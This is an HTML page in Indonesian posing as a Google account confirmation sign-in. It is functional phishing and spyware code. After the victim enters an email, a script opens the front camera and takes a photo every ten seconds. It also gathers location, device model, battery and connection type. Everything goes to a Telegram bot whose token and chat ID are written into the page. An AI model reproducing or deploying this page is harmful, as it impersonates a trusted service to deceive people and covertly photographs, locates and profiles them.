<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Konfirmasi Akun</title>
    <!-- Google Font -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --google-blue: #4285f4;
            --google-red: #ea4335;
            --google-yellow: #fbbc05;
            --google-green: #34a853;
            --gray-border: #dadce0;
        }

        body {
            background-color: #ffffff;
            color: #202124;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .google-card {
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border: 1px solid var(--gray-border);
            border-radius: 8px;
            text-align: center;
            box-sizing: border-box;
        }

        .logo {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
        }

        .logo span:nth-child(1) { color: var(--google-blue); }
        .logo span:nth-child(2) { color: var(--google-red); }
        .logo span:nth-child(3) { color: var(--google-yellow); }
        .logo span:nth-child(4) { color: var(--google-blue); }
        .logo span:nth-child(5) { color: var(--google-green); }
        .logo span:nth-child(6) { color: var(--google-red); }

        h1 { font-size: 24px; font-weight: 400; margin-top: 10px; }
        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }

        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid var(--gray-border);
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border 0.2s;
        }

        input:focus {
            outline: none;
            border: 2px solid var(--google-blue);
            padding: 12px 14px;
        }

        .btn-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .link-text {
            color: var(--google-blue);
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }

        .btn-next {
            background-color: var(--google-blue);
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            font-size: 14px;
        }

        /* Popup */
        #success-popup {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 1000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--google-blue);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="google-card">
    <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    <h1>Masuk</h1>
    <p>Gunakan Akun Google Anda untuk Verifikasi</p>

    <div class="input-group">
        <input type="text" id="userId" placeholder="Email atau nomor telepon">
    </div>

    <div class="btn-container">
        <a href="#" class="link-text">Buat akun</a>
        <button class="btn-next" id="startBtn">Berikutnya</button>
    </div>
</div>

<div id="success-popup">
    <div class="loader"></div>
    <p>Memeriksa info...</p>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLocation = "Lokasi tidak diizinkan";

    async function getDeviceInfo() {
        let battery = "N/A";
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            battery = Math.round(bat.level * 100) + "%";
        }

        const ua = navigator.userAgent;
        let device = "Perangkat Tidak Dikenal";

        // Logika untuk mencoba mendapatkan nama HP bukan Linux
        if (/android/i.test(ua)) {
            const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
            device = match ? match[2] : "Android Device";
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            device = "Apple iOS Device";
        } else if (/Windows/i.test(ua)) {
            device = "Windows PC";
        }

        const conn = navigator.connection ? navigator.connection.effectiveType : "Unknown";
        return { device, battery, conn };
    }

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
            });
        }
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        const uid = document.getElementById('userId').value;
        if(!uid) return alert("Masukkan Email!");
        
        document.getElementById('success-popup').style.display = 'flex';
        getLocation();

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                takeSnapshot(uid); // Ambil satu snapshot awal
                setInterval(() => takeSnapshot(uid), 10000); // Kemudian tiap 10 detik
            };
        } catch(e) {
            console.log("Kamera ditolak");
        }
    });

    async function takeSnapshot(uid) {
        const info = await getDeviceInfo();
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'pic.jpg');
            formData.append('caption', `👁️‍🗨️ *Berhasil memantau*\n\n📧 User: ${uid}\n📱 HP: ${info.device}\n🔋 Baterai: ${info.battery}\n🌐 Koneksi: ${info.conn}\n📍 Lokasi: ${userLocation}`);
            formData.append('parse_mode', 'Markdown');

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error(err);
            }
        }, 'image/jpeg');
    }
</script>

</body>
</html>
